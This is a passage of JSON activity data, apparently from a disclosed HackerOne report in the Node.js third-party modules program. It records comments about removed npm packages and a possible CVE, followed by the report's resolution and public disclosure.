class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-03T08:19:14.352Z","updated_at":"2018-05-03T08:19:14.352Z","actor":{"username":"vdeturckheim","cleared":false,"url":"/vdeturckheim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/010/6f383ac0f9296c13b5ac0d38741f0685dbace58c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2697874,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@vdeturckheim Thanks a lot!","markdown_message":"\u003cp\u003e\u003ca href=\"/vdeturckheim\"\u003e@vdeturckheim\u003c/a\u003e Thanks a lot!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-03T21:28:27.730Z","updated_at":"2018-05-03T21:28:27.730Z","actor":{"username":"tiblu","cleared":false,"url":"/tiblu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/271/442/529046202f2bccb49f0a7ee6ac15f6c59c4eea3d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2704346,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@tiblu I'll mostly be away this week. I'll try to ping the npm sec team who wrote about this to see if there is anything to do with them to move forward :) ","markdown_message":"\u003cp\u003e\u003ca href=\"/tiblu\"\u003e@tiblu\u003c/a\u003e I\u0026#39;ll mostly be away this week. I\u0026#39;ll try to ping the npm sec team who wrote about this to see if there is anything to do with them to move forward :) \u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-05T19:32:46.979Z","updated_at":"2018-05-05T19:32:46.979Z","actor":{"username":"vdeturckheim","cleared":false,"url":"/vdeturckheim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/010/6f383ac0f9296c13b5ac0d38741f0685dbace58c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2704507,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"WDYM by \"move forward\"? The packages have been removed, so we should be golden.","markdown_message":"\u003cp\u003eWDYM by \u0026quot;move forward\u0026quot;? The packages have been removed, so we should be golden.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-05T21:32:08.137Z","updated_at":"2018-05-05T21:32:08.137Z","actor":{"username":"tiblu","cleared":false,"url":"/tiblu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/271/442/529046202f2bccb49f0a7ee6ac15f6c59c4eea3d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2748110,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry I was away last week. I want to check if they already have assigned a CVE for this.","markdown_message":"\u003cp\u003eSorry I was away last week. I want to check if they already have assigned a CVE for this.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-15T19:24:19.835Z","updated_at":"2018-05-15T19:24:19.835Z","actor":{"username":"vdeturckheim","cleared":false,"url":"/vdeturckheim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/010/6f383ac0f9296c13b5ac0d38741f0685dbace58c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2748196,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-15T19:47:34.616Z","updated_at":"2018-05-15T19:47:34.616Z","actor":{"username":"vdeturckheim","cleared":false,"url":"/vdeturckheim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/010/6f383ac0f9296c13b5ac0d38741f0685dbace58c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"old_scope":"express","new_scope":"Other module","genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4245237,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-03T00:50:09.258Z","updated_at":"2019-03-03T00:50:09.258Z","actor":{"username":"ronperris","cleared":false,"url":"/ronperris","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/267/443/1a8173396b482236436c5172363ceb9f64ef27dd_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"tiblu","url":"/tiblu"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4255430,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-04T20:00:20.306Z","updated_at":"2019-03-04T20:00:20.306Z","first_to_agree":true,"actor":{"username":"ronperris","cleared":false,"url":"/ronperris","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/267/443/1a8173396b482236436c5172363ceb9f64ef27dd_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4460560,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-03T20:00:26.277Z","updated_at":"2019-04-03T20:00:26.277Z","actor":{"url":"/nodejs-ecosystem","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Node.js third-party modules"}},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}